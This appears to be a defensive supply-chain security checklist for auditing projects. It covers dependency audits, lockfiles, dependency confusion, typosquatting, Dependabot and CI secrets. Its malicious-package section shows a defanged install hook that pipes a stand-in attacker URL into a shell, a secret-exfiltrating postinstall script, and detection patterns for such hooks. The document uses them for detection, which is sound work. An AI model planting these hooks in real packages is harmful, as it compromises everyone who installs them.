# Supply Chain Security — Instruction 16

## Coverage

CWE-1357 (Dependency on Vulnerable Package), OWASP A06:2021
npm, pip, composer, go modules — dependency attacks

---

## Dependency Vulnerability Checks

### 1. Run Dependency Audit

```bash
# Node.js
npm audit
npm audit --json  # for programmatic parsing
yarn audit

# Python
pip-audit
safety check -r requirements.txt

# PHP
composer audit

# Go
govulncheck ./...

# Ruby
bundle audit

# Java
mvn dependency-check:check  # OWASP Dependency Check plugin
```

Flag any: Critical or High severity vulnerabilities

### 2. Outdated Dependencies

```bash
# Node.js
npm outdated

# Python
pip list --outdated

# Check for packages not updated in > 1 year (potential abandonment)
```

---

## Lockfiles

### 3. Lockfile Committed to Git

```
// 🔴 No lockfile = non-deterministic installs = supply chain risk
// 🟢 Always commit:
package-lock.json    (npm)
yarn.lock            (yarn)
pnpm-lock.yaml       (pnpm)
Pipfile.lock         (pipenv)
poetry.lock          (poetry)
Gemfile.lock         (ruby)
go.sum               (go)
```

### 4. Lockfile Not Tampered

```
// 🔴 Lockfile manually edited (especially in PRs from unknown contributors)
// 🟢 Verify lockfile matches package.json:
npm ci  // fails if lockfile doesn't match package.json
// Never npm install in production (use npm ci)
```

---

## Malicious Package Checks

### 5. npm Scripts (postinstall/preinstall)

```js
// 🔴 Malicious package installs backdoor on npm install
// Check direct dependencies' package.json for dangerous scripts:
// Red flags to detect in any dependency's install hooks (examples defanged
// with [.] so they are illustrative, not runnable):
"scripts": {
  // Pattern 1 — fetch remote code and pipe straight into a shell:
  "preinstall": "curl https://attacker[.]example/p | sh",   // also: wget|bash, eval(...)
  // Pattern 2 — run a local script at install time that reads env/secrets:
  "postinstall": "node ./exfiltrate-secrets.js"
}
// Flag ANY preinstall/postinstall/prepare hook that: pipes a download into a
// shell (curl|wget … | sh|bash), uses eval/child_process, or reads process.env.

// 🟢 Review scripts of new packages before adding
// 🟢 Use --ignore-scripts in CI (but may break some legit packages)
npm ci --ignore-scripts

// 🟢 Consider using socket.dev to scan packages for malicious behavior
```

### 6. Dependency Confusion Attack

```js
// 🔴 Private package name collides with public npm package
// Attacker publishes @company/internal-pkg on public npm with higher version
// npm may download attacker's public version instead of private

// 🟢 Use scoped packages and configure registry
// .npmrc:
@company:registry=https://your-private-registry.com
// package.json:
"@company/internal-pkg": "^1.0.0"  // scoped = always from private registry

// 🟢 Add publishConfig to private packages to prevent accidental public publish
"publishConfig": { "registry": "https://your-private-registry.com" }
```

### 7. Typosquatting Detection

```
// Scan for packages with names similar to popular packages:
// lodahs, reqeust, monment, expres, axois, etc.
// Cross-reference against: https://socket.dev, npm audit
// Flag any package with:
// - Similar name to popular package but different publisher
// - Very recent publish date
// - 0 downloads but used in project
```

---

## Dependabot / Automated Updates

### 8. Dependabot Configuration

Check `.github/dependabot.yml` exists.
If not → create (Level 2):

```yaml
version: 2
updates:
  - package-ecosystem: 'npm'
    directory: '/'
    schedule:
      interval: 'weekly'
    open-pull-requests-limit: 10
    labels:
      - 'dependencies'
      - 'security'
    ignore:
      - dependency-name: 'aws-sdk'
        update-types: ['version-update:semver-major']
```

---

## License Compliance

### 9. License Check

```bash
# Node.js
npx license-checker --onlyAllow 'MIT;ISC;Apache-2.0;BSD-2-Clause;BSD-3-Clause'

# Flag if project is commercial and uses GPL/AGPL packages
# GPL/AGPL in commercial SaaS = potential license violation
```

---

## CI/CD Pipeline Security

### 10. Build Output Integrity

```yaml
# GitHub Actions: verify build artifacts haven't been tampered
# Use actions/attest-build-provenance for SLSA compliance
- uses: actions/attest-build-provenance@v1
  with:
    subject-path: dist/
```

### 11. Secrets in CI Environment

```
# Scan CI configuration files for hardcoded secrets:
.github/workflows/*.yml
.gitlab-ci.yml
Jenkinsfile
.circleci/config.yml

# 🔴 Hardcoded secret in CI config
env:
  API_KEY: sk_live_abc123  # 🔴

# 🟢 Use secrets store
env:
  API_KEY: ${{ secrets.API_KEY }}
```
